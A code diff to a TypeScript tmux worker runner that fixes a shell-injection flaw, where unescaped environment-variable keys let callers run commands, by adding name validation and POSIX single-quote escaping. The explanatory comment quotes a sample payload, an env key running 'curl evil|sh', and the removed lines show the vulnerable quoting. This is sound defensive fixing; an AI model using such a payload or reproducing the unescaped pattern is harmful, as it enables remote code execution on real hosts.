@@ -6,6 +6,33 @@ import type { WorkerProcess, WorkerRunner, WorkerInfo, WorkerSpec } from "@uacc/
 
 export const TMUX_PREFIX = "uacc-";
 
+/**
+ * BUG (found by an independent red-team review, 2026-09-18, T4.10): the
+ * shell command line `spawn()` builds interpolates every `spec.env` KEY
+ * unescaped and unvalidated — only VALUES were quoted. `spec.env` is
+ * client-reachable (`SessionSpec.env` in `CreateSessionBody`, forwarded
+ * unchanged by every adapter that spawns a worker), so an env key like
+ * `` X=$(curl evil|sh) `` produced a real shell command-substitution RCE
+ * when the resulting `env <keys...> <cmd>; echo ...` string reached
+ * `tmux respawn-pane` (which runs it via the pane's shell) — reproduced
+ * live: the exact string-building logic below, run through `sh -c`,
+ * executed the injected command. POSIX only allows `[A-Za-z_][A-Za-z0-9_]*`
+ * as a variable name; anything else is refused outright rather than
+ * "sanitized" (a name containing `=` or `$(...)` has no safe rewritten
+ * form that preserves intent — the caller's env object is simply wrong).
+ */
+const SAFE_ENV_KEY = /^[A-Za-z_][A-Za-z0-9_]*$/;
+
+function shellQuote(value: string): string {
+  // Single-quote the whole value, escaping embedded single quotes the
+  // standard POSIX way ('\'') — properly escapes instead of the previous
+  // `replaceAll("'", "")`, which silently deleted embedded quotes instead
+  // of preserving them (found alongside the injection above; same file,
+  // same line, worth fixing together rather than leaving unsound
+  // value-quoting next to a freshly-fixed key-quoting bug).
+  return `'${value.replaceAll("'", `'\\''`)}'`;
+}
+
 function execTmux(args: string[], opts: { cwd?: string } = {}): Promise<{ code: number; stdout: string; stderr: string }> {
   return new Promise((resolve, reject) => {
     const proc = spawn("tmux", args, { cwd: opts.cwd, stdio: ["ignore", "pipe", "pipe"] });
@@ -110,6 +137,14 @@ export class TmuxRunner implements WorkerRunner {
   }
 
   async spawn(spec: WorkerSpec): Promise<WorkerProcess> {
+    // Validated FIRST, before any I/O: a rejected env key must never reach
+    // tmux, and reachability shouldn't depend on tmux being installed.
+    for (const key of Object.keys(spec.env ?? {})) {
+      if (!SAFE_ENV_KEY.test(key)) {
+        throw new Error(`TmuxRunner: invalid environment variable name "${key}" — refusing to spawn (shell-injection guard)`);
+      }
+    }
+
     await mkdir(this.logDir, { recursive: true });
     const full = this.fullName(spec.name ?? "session");
     const logPath = join(this.logDir, `${full}.log`);
@@ -119,10 +154,10 @@ export class TmuxRunner implements WorkerRunner {
     await rm(logPath, { force: true });
 
     const cmdLine = spec.cmd
-      .map((a) => (/^[\w./=@%^+:-]+$/.test(a) ? a : `'${a.replaceAll("'", `'\\''`)}'`))
+      .map((a) => (/^[\w./=@%^+:-]+$/.test(a) ? a : shellQuote(a)))
       .join(" ");
     const envPrefix = Object.entries(spec.env ?? {})
-      .map(([k, v]) => `${k}='${v.replaceAll("'", "")}'`)
+      .map(([k, v]) => `${k}=${shellQuote(v)}`)
       .join(" ");
     const shellCmd = `env ${envPrefix} ${cmdLine}; echo "__UACC_EXIT__$?"`;
 
